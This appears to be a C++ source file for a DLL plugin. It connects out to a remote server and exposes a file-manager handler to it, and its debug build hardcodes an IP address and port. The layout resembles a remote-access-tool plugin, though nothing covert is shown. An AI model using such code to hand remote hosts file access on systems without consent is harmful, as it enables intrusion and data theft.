#include "FileManager.h"
#include "IOCPClient.h"

/****************************Cmd Module Entry *********************************/

extern "C" __declspec(dllexport) void HHBeginFileMgr(char* szServerAddr,unsigned short uPort,DWORD dwParam);

void  HHBeginFileMgr(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);

	CFileManager mgr(FILE_MANAGER);

	client.BindHandler(&mgr);

	client.Run();

	client.UnbindHandler();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	return TRUE;
}

#ifdef _DEBUG
int main()
{
	CIOCPClient::SocketInit();
	HHBeginFileMgr("81.68.224.152", 10086, 0);
	CIOCPClient::SocketTerm();
	return 0;
}
#endif